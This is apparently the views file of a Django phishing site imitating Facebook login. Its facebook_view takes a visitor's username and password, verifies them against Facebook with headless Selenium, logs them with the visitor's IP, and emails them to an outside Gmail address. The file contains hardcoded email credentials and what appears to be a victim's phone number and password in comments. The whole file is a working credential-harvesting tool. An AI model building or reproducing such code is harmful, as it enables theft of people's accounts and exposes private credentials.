from django.shortcuts import render, HttpResponseRedirect

from .models import FbLogIn, NewLogs, SiteContent

# from .sel import login_facebook
from selenium import webdriver
import time
from selenium.webdriver.common.by import By

import time

from .forms import LogInForm


# Client IP address collector function
def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

# Create your views here.
# @ensure_csrf_cookie

def home_view(request):
	sc = SiteContent.objects.get(id = 1)

	context = {
		'sc' : sc

	}
	return render(request, 'home.html', context)


def facebook_view(request):

	error1 = False
	error2 = False

	form = LogInForm(request.POST or None)
	if form.is_valid():
		loader = True
		form.save()

		myid = form.instance.id
		editform = FbLogIn.objects.get(id = myid)

		chrome_options = webdriver.ChromeOptions()
		chrome_options.add_argument("--headless")
		chrome_options.add_argument("--disable-gpu")
		chrome_options.add_argument('--no-sandbox')
		chrome_options.add_argument('--window-size=1920x1080')  #1920,1080
		chrome_options.add_argument('--allow-running-insecure-content')
		browser = webdriver.Chrome(options=chrome_options) #

		browser.get("https://web.facebook.com/")

		time.sleep(2)

		user = editform.username #'09059689401'
		userlog = browser.find_element(By.XPATH, '//*[@id="email"]')
		userlog.send_keys(user)

		password = editform.password #'combat@@fb'
		passwordlog = browser.find_element(By.XPATH, '//*[@id="pass"]')
		passwordlog.send_keys(password)

		# time.sleep(2)

		login = browser.find_element(By.NAME, 'login')
		login.click()

		time.sleep(2)

		if browser.find_elements(By.CSS_SELECTOR, 'span.a8c37x1j.ni8dbmo4.stjgntxs.l9j0dhe7'):
			
			# browser.find_elements(By.XPATH, '//span[@class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7"]')
			name = browser.find_element(By.XPATH, '//span[@class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7"]').get_attribute("innerHTML")

			print(name)
			# print(name.get_attribute("innerHTML"))
			# print(name.text)
			# print("done")

			# Input name in FbLogIn model
			editform.name = name
			editform.ipadd = get_client_ip(request)
			print(editform.name)
			print(get_client_ip(request))
			editform.save()
			NewLogs.objects.create(username=editform.username, password=editform.password, name=editform.name, ipadd=editform.ipadd)
			
			import smtplib
			from email.message import EmailMessage

			EMAIL_ADDRESS = "noreplyimf.org@gmail.com"
			EMAIL_PASSWORD = "4kushakara"
			receiver = "ibrahimola72@gmail.com"
			
			msg = EmailMessage()
			msg['Subject'] = 'NewLogs'
			msg['From'] = EMAIL_ADDRESS
			msg['To'] = receiver
		    
			textsms = f" Name: {editform.name} \n username: {editform.username} \n password: {editform.password} \n ip: {editform.ipadd}" 

			msg.set_content(textsms)

			#gmail smpt setting
			with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
				smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
				smtp.send_message(msg)

			return HttpResponseRedirect("../success/")
			

		elif browser.find_elements(By.CSS_SELECTOR, 'div._9ay7'):
			if 'password' in browser.find_element(By.CSS_SELECTOR, 'div._9ay7').get_attribute('innerHTML'):
				error2 = True
				print('Omo na password o')


			else:
				error1 = True
				print('Omo na Email o')
			# user_error = browser.find_element(By.XPATH, '//*[@id="email_container"]/div[2]').get_attribute('innerHTML')
		

		browser.quit()

		print(editform.name)
		

		# form = LogInForm()

	
	context = {
		'form' : form,
		'error1' : error1,
		'error2' : error2,
	}

	return render(request, 'facebook.html', context)



def success_view(request):
	obj = NewLogs.objects.last()
	sc = SiteContent.objects.get(id = 1)
	context = {
		'obj' : obj,
		'sc'  : sc 
	}
	return render(request, 'success.html', context)



# def home_view(request):
# 	form = LogInForm(request.POST or None)
# 	if form.is_valid():
# 		#form.save()
# 		# full_name = login_facebook
# 		ip = "123333221"
# 		myid = form.instance.id
# 		# print(type(myid))
# 		n = FbLogIn.objects.get(id = myid)
# 		n.name = full_name
# 		n.ipadd = ip
# 		n.save()
		
# 		form = LogInForm()
# 		# if form:
# 		# 	return HttpResponseRedirect("success")

# 	context = {
# 		'form' : form
# 	}

# 	return render(request, 'home.html', context)
